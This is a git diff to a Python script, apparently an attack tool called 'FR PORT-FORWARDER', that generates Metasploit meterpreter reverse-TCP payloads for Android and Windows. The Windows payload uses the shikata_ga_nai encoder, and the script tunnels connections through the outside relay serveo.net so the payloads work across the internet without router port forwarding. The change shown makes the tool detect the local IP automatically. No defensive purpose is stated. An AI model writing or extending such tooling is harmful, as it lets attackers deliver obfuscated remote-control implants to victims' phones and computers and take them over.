@@ -6,7 +6,9 @@ print("""
 █████╗  ██████╔╝
 ██╔══╝  ██╔══██╗
 ██║     ██║  ██║
-╚═╝     ╚═╝  ╚═╝PORT-FORWARDER
+╚═╝     ╚═╝  ╚═╝PORT-FORWARDER 
+It will automatically find your internal ip ,,, So You don't need to enter it manually,,you just need to enter 
+a Random port to forward over Internet
 
 USE YOUR MSF PAYLOAD OVER THE INTERNET WITHOUT ACTUAL PORT FORWARDING WITH
 ROUTER OR VPN
@@ -21,7 +23,7 @@ print("ENTER THE CHOICE....")
 payload_choice=int(input("FRportfwd>>># "))
 if payload_choice==1:
 	malware="android/meterpreter/reverse_tcp"
-	ip=input("ENTER YOUR LOCAL IP ADDRESS : ")
+	ip=socket.gethostbyname(socket.gethostname())
 	port=input("ENTER THE PORT TO FORWARD OVER WAN : ")
 	path=input("enter the path to save your payload : ")	
 	serv=socket.gethostbyname("serveo.net")
@@ -60,7 +62,7 @@ elif payload_choice==2:
 	malware="windows/meterpreter/reverse_tcp"
 	encoder="x86/shikata_ga_nai"
 	plat="--platform=windows"
-	ip=input("ENTER YOUR LOCAL IP ADDRESS : ")
+	ip=socket.gethostbyname(socket.gethostname())
 	port=input("ENTER THE PORT TO FORWARD OVER WAN : ")
 	path=input("enter the path to save your payload : ")	
 	serv=socket.gethostbyname("serveo.net")
